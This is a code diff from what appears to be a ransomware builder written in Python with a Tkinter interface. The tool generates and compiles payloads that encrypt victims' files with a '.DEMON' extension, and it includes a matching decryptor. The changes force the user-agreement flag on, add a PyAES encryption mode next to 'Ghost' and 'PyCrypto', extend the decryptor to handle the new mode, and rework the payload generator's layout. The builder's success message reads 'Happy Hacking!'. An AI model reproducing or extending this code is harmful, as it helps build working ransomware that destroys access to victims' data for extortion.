@@ -66,8 +66,14 @@ try:
     from Crypto.Cipher import AES
     from pymsgbox import *
 except ImportError as e:
-    print('ERROR - Failed to import some modules.\n\n%s' % e)
+    print('ERROR - Failed to import some modules.\n%s' % e)
     pass
+
+try:
+    import pyaes
+except ImportError:
+    print('ERROR - Failed to import some modules.\n%s' % e)
+
 
 def resource_path(relative_path):
     if hasattr(sys, '_MEIPASS'):
@@ -104,6 +110,15 @@ def decrypt_file(file_name, key):
     dec = decrypt(ciphertext, key)
     with open(file_name[:-6], 'wb') as f:
         f.write(dec)
+
+def decrypt_file_pyaes(file_name, key):
+    aes = pyaes.AESModeOfOperationCTR(key)
+
+    with open(file_name, 'rb') as fo:
+        plaintext = fo.read()
+    dec = aes.decrypt(plaintext)
+    with open(file_name[:-6], 'wb') as fo:
+        fo.write(dec)
 
 class MainWindow(Tk):
     def __init__(self):
@@ -143,7 +158,7 @@ class MainWindow(Tk):
             'full_screen_var' : IntVar(),
             'mode' : IntVar(),
             'demo' : IntVar(),
-            'ghost' : IntVar(),
+            'type' : StringVar(),
             'icon_path' : StringVar(),
             'payload_path' : StringVar(),
             'msg' : StringVar(),
@@ -154,7 +169,7 @@ class MainWindow(Tk):
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -166,7 +181,7 @@ class MainWindow(Tk):
         self.options['full_screen_var'].set(1)
         self.options['mode'].set(1)
         self.options['demo'].set(0)
-        self.options['ghost'].set(0)
+        self.options['type'].set('pycrypto')
         self.options['debug'].set(0)
         self.options['ext'].set('.DEMON')
 
@@ -493,9 +508,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 py = 'pyinstaller'
 
             if icon == True:
-                os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycryptodome --hidden-import io %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
+                os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycryptodome --hidden-import io --hidden-import pyaes %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
             else:
-                os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycryptodome --hidden-import io %s" % (py, self.options['payload_path'].get()))
+                os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycryptodome --hidden-import io --hidden-import pyaes %s" % (py, self.options['payload_path'].get()))
 
             messagebox.showinfo('SUCCESS', 'Compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
             self.comp.destroy()
@@ -531,19 +546,24 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         Entry(server_frame, textvariable = self.options['port'], width = 20).grid(row = 1, column = 1)
 
         options_frame = LabelFrame(self.gen, text = 'Options')
-        options_frame.grid(row = 1, column = 0)
+        options_frame.grid(row = 0, column = 3, sticky = 'w')
         Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0)
-        Checkbutton(options_frame, text = 'Ghost mode', variable = self.options['ghost'], onvalue = 1, offvalue = 0).grid(row = 0, column = 1)
         Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0)
 
         content_frame = LabelFrame(self.gen, text = 'Content')
-        content_frame.grid(row = 1, column = 1)
+        content_frame.grid(row = 1, column = 0, sticky = 'w')
         set_msg = Button(content_frame, text = 'CUSTOM MESSAGE', command = self.set_msg, width = 25).grid(row = 0, column = 0)
         set_img = Button(content_frame, text = 'CUSTOM IMAGE', command = self.set_img, width = 25).grid(row = 1, column = 0)
 
+        enc_frame = LabelFrame(self.gen, text = 'Encryption Type')
+        enc_frame.grid(row = 1, column = 1, sticky = 'w')
+        Radiobutton(enc_frame, text = 'Ghost (Fastest)', variable = self.options['type'], value = 'ghost').grid(row = 0, column = 0, sticky = 'w')
+        Radiobutton(enc_frame, text = 'PyCrypto (Fast)', variable = self.options['type'], value = 'pycrypto').grid(row = 1, column = 0, sticky = 'w')
+        Radiobutton(enc_frame, text = 'PyAES (Slow)', variable = self.options['type'], value = 'pyaes').grid(row = 2, column = 0, sticky = 'w')
+
         finish_frame = LabelFrame(self.gen, text = 'Finish')
-        finish_frame.grid(row = 2, column = 0, columnspan = 2)
-        generate = Button(finish_frame, text = "GENERATE", command = self.make_demon, width = 50).grid(row = 0, column = 0)
+        finish_frame.grid(row = 2, column = 0, columnspan = 1, sticky = 'w')
+        generate = Button(finish_frame, text = "GENERATE", command = self.make_demon, width = 25).grid(row = 0, column = 0)
 
     def set_img(self):
         try:
@@ -583,7 +603,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['port'].get(),
                 self.options['full_screen_var'].get(),
                 self.options['demo'].get(),
-                self.options['ghost'].get(),
+                self.options['type'].get(),
                 self.options['msg'].get(),
                 self.options['img_base64'].get(),
                 self.options['mode'].get(),
@@ -594,6 +614,11 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             messagebox.showwarning('ERROR', 'Failed to generate payload!\n\n%s' % e)
 
     def decrypt_files(self):
+        ask = confirm(text='What type of encryption are we dealing with?', buttons=['PyCrypto', 'PyAES', "I don't know"])
+        if ask == "I don't know":
+            messagebox.showinfo('Encryption type detection', 'Comming Soon!\n\nIf you really dont know, test it on one file first.')
+            return
+
         key = dec_key()
         key = key.encode('utf-8')
         if key == False:
@@ -603,7 +628,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         if p == False:
             return
 
-        a = messagebox.askokcancel('WARNING', 'This tool will decrypt your files with the given key.\n\nHowever, if your key is not correct, your files will return corrupted.\n\n You might want to make a backup!')
+        a = messagebox.askokcancel('WARNING', 'This tool will decrypt your files with the given key.\n\nHowever, if your key or method is not correct, your files will return corrupted.\n\n You might want to make a backup!')
         if a == True:
             pass
         else:
@@ -614,10 +639,18 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             for path, subdirs, files in os.walk(p):
                 for name in files:
                     if name.endswith(".DEMON"):
-                        decrypt_file(os.path.join(path, name), key)
-                        print("[Decrypted] %s" % name)
-                        counter+=1
-                        os.remove(os.path.join(path, name))
+                        if ask == 'PyCrypto':
+                            decrypt_file(os.path.join(path, name), key)
+                            print("[Decrypted] %s" % name)
+                            counter+=1
+                            os.remove(os.path.join(path, name))
+                        elif ask == 'PyAES':
+                            print("[Decrypting] %s" % name)
+                            decrypt_file_pyaes(os.path.join(path, name), key)
+                            counter+=1
+                            os.remove(os.path.join(path, name))
+                        else:
+                            return
                     else:
                         print("[Skipped] %s" % name)
             print("\n[DONE] Decrypted %i files" % counter)
